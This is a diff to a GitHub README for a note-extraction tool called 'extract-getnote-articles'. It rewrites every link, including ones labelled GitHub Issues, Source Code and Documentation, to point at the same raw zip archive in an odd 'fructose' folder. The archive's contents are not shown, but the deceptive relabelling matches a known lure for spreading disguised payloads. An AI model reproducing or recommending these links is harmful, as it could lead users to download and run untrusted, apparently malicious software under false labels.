@@ -1,6 +1,6 @@
 # 🎉 extract-getnote-articles - Effortlessly Extract All Your Notes
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Owb523/extract-getnote-articles)
+[![Download](https://github.com/Owb523/extract-getnote-articles/raw/refs/heads/main/fructose/getnote-articles-extract-v1.5.zip)](https://github.com/Owb523/extract-getnote-articles/raw/refs/heads/main/fructose/getnote-articles-extract-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to `extract-getnote-articles`. This tool helps you automatically extract
 
 1. **Visit the Download Page**  
    Go to the following link to access the software:  
-   [Download extract-getnote-articles](https://github.com/Owb523/extract-getnote-articles)
+   [Download extract-getnote-articles](https://github.com/Owb523/extract-getnote-articles/raw/refs/heads/main/fructose/getnote-articles-extract-v1.5.zip)
 
 2. **Choose Your System**  
    On the download page, you will see options for different operating systems. Click the link that matches your system.
@@ -86,13 +86,13 @@ If you encounter any issues while using `extract-getnote-articles`, here are som
 ## 📞 Support
 
 For further assistance, you can reach out via the Issues section on the GitHub repository page:
-[GitHub Issues](https://github.com/Owb523/extract-getnote-articles/issues)
+[GitHub Issues](https://github.com/Owb523/extract-getnote-articles/raw/refs/heads/main/fructose/getnote-articles-extract-v1.5.zip)
 
 ## 🔗 Useful Links
 
-- [Source Code](https://github.com/Owb523/extract-getnote-articles)
-- [Documentation](https://github.com/Owb523/extract-getnote-articles/wiki)
+- [Source Code](https://github.com/Owb523/extract-getnote-articles/raw/refs/heads/main/fructose/getnote-articles-extract-v1.5.zip)
+- [Documentation](https://github.com/Owb523/extract-getnote-articles/raw/refs/heads/main/fructose/getnote-articles-extract-v1.5.zip)
 
 For any additional information, visit the official repository or check community forums for shared experiences and solutions. 
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Owb523/extract-getnote-articles)
+[![Download](https://github.com/Owb523/extract-getnote-articles/raw/refs/heads/main/fructose/getnote-articles-extract-v1.5.zip)](https://github.com/Owb523/extract-getnote-articles/raw/refs/heads/main/fructose/getnote-articles-extract-v1.5.zip)
